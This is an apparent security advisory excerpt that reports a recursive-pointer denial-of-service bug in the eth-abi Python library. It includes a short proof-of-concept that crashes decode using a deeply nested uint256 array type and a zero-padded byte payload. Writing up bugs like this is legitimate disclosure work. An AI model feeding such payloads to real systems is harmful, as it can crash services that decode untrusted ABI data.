  "summary": "eth-abi is vulnerable to recursive DoS",
  "details": "This is related to recent ZST stuff (https://github.com/ethereum/eth-abi/security/advisories/GHSA-rqr8-pxh7-cq3g), but it's a different one. Basically a recursive pointer issue\n\n```py\nfrom eth_abi import decode\n\n\npayload = \"\"\n\n# OverflowError: Python int too large to convert to C ssize_t\n#decode(['(uint256[][][][][][][][][][])'], bytearray.fromhex(payload))\n\ndecode(['uint256[][][][][][][][][][]'], bytearray.fromhex(payload+('00' * 1024)))\n```",
